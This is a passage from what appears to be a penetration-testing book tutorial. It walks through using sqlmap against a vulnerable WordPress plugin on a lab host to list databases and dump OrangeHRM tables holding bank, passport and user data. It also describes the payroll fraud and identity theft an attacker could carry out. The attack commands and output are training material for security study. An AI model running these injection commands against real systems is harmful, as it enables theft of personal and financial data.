<pre style="padding-left: 60px"><strong>[03:04:37] [INFO] fetching database names</strong><br/><strong>[03:04:37] [INFO] the SQL query used returns 34 entries</strong><br/><strong>available databases [34]:</strong><br/><strong>[*] .svn</strong><br/><strong>[*] bricks</strong><br/><strong>[*] bwapp</strong><br/><strong>[*] citizens</strong><br/><strong>[*] cryptomg</strong><br/><strong>[*] dvwa</strong><br/><strong>[*] gallery2</strong><br/><strong>[*] getboo</strong><br/><strong>[*] ghost</strong><br/><strong>[*] gtd-php</strong><br/><strong>[*] hex</strong><br/><strong>[*] information_schema</strong><br/><strong>[*] isp</strong><br/><strong>[*] joomla</strong><br/><strong>[*] mutillidae</strong><br/><strong>[*] mysql</strong><br/><strong>[*] nowasp</strong><br/><strong>[*] orangehrm</strong><br/><strong>[*] personalblog</strong><br/><strong>[*] peruggia</strong><br/><strong>[*] phpbb</strong><br/><strong>[*] phpmyadmin</strong><br/><strong>[*] proxy</strong><br/><strong>[*] rentnet</strong><br/><strong>[*] sqlol</strong><br/><strong>[*] tikiwiki</strong><br/><strong>[*] vicnum</strong><br/><strong>[*] wackopicko</strong><br/><strong>[*] wavsepdb</strong><br/><strong>[*] webcal</strong><br/><strong>[*] webgoat_coins</strong><br/><strong>[*] wordpress</strong><br/><strong>[*] wraithlogin</strong><br/><strong>[*] yazd</strong></pre>
<ol start="6">
<li>From the list of available databases, we will work with OrangeHRM, as it is a human resources management application. From the command line, run the following to dump the tables that are present in the OrangeHRM database:</li>
</ol>
<pre style="padding-left: 60px"><strong>root@kali:~/Chapter9# sqlmap -u "http://192.168.56.100/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1" --tables -D orangehrm</strong></pre>
<ol start="7">
<li>This will dump a list of all the tables in the OrangeHRM database, and the amount of data it returns is substantial, 84 tables to be exact. In the list that is output, you will see some interesting ones such as:</li>
</ol>
<div class="packt_quote packt_infobox">hs_hr_customer                 (Customers)<br/>
hs_hr_emp_directdebit     (Bank account information for direct deposit)<br/>
hs_hr_emp_passport        (Passport records)<br/>
hs_hr_employee                 (Detailed employee info)<br/>
hs_hr_users                        (HR app users, able to create/modify users,<br/>
                                              employees, and so on)</div>
<ol start="8">
<li>With the information from the database, an attacker would be able to extract and crack user credentials for an administrator and log in with super user rights. They could create a fake employee, generate a payroll record, and have payroll sent via direct deposit to an outside bank. They would also be able to use the information to steal the identities of any employee, manipulate their salaries, and so on.</li>
</ol>
<div class="packt_tip packt_infobox">It is important to note that even though we started on an application not related to the HR application, because they were housed on the same MySQL server, and the user credentials used had to access to all databases, we were easily able to jump between databases, even if, in this case, the HR application was only available internally.</div>


            </article>

            
        </section>
    </body></html>